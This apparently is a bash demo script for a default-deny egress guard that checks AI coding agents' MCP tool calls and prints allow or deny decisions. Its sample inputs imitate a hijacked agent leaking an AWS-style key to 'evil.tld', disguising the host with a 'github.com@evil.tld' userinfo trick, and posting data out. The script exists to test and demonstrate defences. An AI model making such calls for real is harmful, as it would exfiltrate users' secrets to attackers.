#!/usr/bin/env bash
# Live, offline demo of the cross-provider egress guard.
#
# Feeds a handful of representative tool calls to the Claude Code MCP hook
# (mcp-guard.sh) and prints the gate's decision for each: a default-deny
# egress wall in action. No install, no network, no secrets. Just bash + jq.
#
#   bash demo/demo.sh
#
# The same enforcement runs unchanged for Codex via codex/codex-egress.patch,
# off this same policy file.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="$ROOT/claude-code/hooks/mcp-guard.sh"
POLICY="$ROOT/policy/mcp-gate-policy.example.json"
export MCP_GATE_POLICY="$POLICY"

# Colors (fall back to plain if not a tty).
if [ -t 1 ]; then
  R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; B=$'\033[34m'; DIM=$'\033[2m'; BOLD=$'\033[1m'; X=$'\033[0m'
else
  R=''; G=''; Y=''; B=''; DIM=''; BOLD=''; X=''
fi

banner() {
  printf '%s\n' "${BOLD}${B}  cross-provider egress guard  ${X}${DIM}default-deny, off one shared policy${X}"
  printf '%s\n\n' "${DIM}  every network/send-class tool call is gated before it dispatches${X}"
}

# show <label> <tool_name> <tool_input-json> [policy-override-file]
show() {
  local label="$1" tool="$2" input="$3" policy="${4:-$POLICY}"
  local json out decision reason
  json=$(printf '{"tool_name":"%s","tool_input":%s}' "$tool" "$input")
  out=$(printf '%s' "$json" | MCP_GATE_POLICY="$policy" bash "$HOOK" 2>/dev/null)
  reason=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // empty' 2>/dev/null)
  if printf '%s' "$out" | grep -q '"permissionDecision":[[:space:]]*"deny"'; then
    decision="${R}${BOLD}DENY ${X}"
  else
    decision="${G}${BOLD}ALLOW${X}"
  fi
  printf '  %s  %s\n' "$decision" "${BOLD}${label}${X}"
  printf '         %s%s%s\n' "$DIM" "$tool" "$X"
  [ -n "$reason" ] && printf '         %s↳ %s%s\n' "$DIM" "$reason" "$X"
  printf '\n'
}

banner

printf '%s\n\n' "${Y}── A hijacked agent tries to phone home ──${X}"
show "Navigate to an attacker host" \
  "mcp__claude_ai_browser__browser_navigate" \
  '{"url":"https://evil.tld/?leak=AKIA..."}'

show "Deceptive host: github.com@evil.tld (userinfo spoof)" \
  "mcp__claude_ai_browser__browser_navigate" \
  '{"url":"https://github.com@evil.tld/collect"}'

show "Unknown connector, no URL to inspect" \
  "mcp__codex_apps__notion__create_page" \
  '{"title":"exfil","body":"..."}'

show "Arbitrary MCP server with an http_post tool" \
  "mcp__randomsrv__http_post" \
  '{"url":"https://evil.tld/in"}'

printf '%s\n\n' "${Y}── Legitimate, allow-listed work still flows ──${X}"
show "Navigate to an allow-listed host" \
  "mcp__claude_ai_browser__browser_navigate" \
  '{"url":"https://github.com/cli/cli"}'

printf '%s\n\n' "${Y}── Fail closed: policy missing or unreadable ──${X}"
show "Same github.com call, but the policy is gone" \
  "mcp__claude_ai_browser__browser_navigate" \
  '{"url":"https://github.com/cli/cli"}' \
  "/no/such/policy.json"

printf '%s\n' "${DIM}  Full deterministic suite (200+ assertions, both agents, CI gate):${X}"
printf '%s\n' "${BOLD}  bash tests/run-all.sh${X}"
